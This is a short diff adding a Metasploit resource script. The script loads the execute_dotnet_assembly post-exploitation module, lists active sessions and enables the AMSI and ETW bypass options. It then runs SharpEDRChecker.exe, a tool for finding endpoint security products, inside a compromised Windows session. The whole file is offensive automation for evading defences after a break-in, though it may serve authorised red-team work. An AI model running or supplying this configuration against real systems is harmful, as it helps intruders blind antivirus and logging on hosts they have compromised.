@@ -1,0 +1,16 @@
+<ruby>
+CWD = Dir.pwd
+DOTNET_EXE = "#{CWD}/exe/SharpEDRChecker.exe"
+
+run_single('use post/windows/manage/execute_dotnet_assembly')
+
+run_single('sessions -l -x')
+run_single('options')
+run_single("set ARGUMENTS ''")
+run_single("set AMSIBYPASS true")
+run_single("set ETWBYPASS true")
+run_single('set TECHNIQUE SELF')
+run_single("set DOTNET_EXE #{DOTNET_EXE}")
+
+sleep(1)
+</ruby>
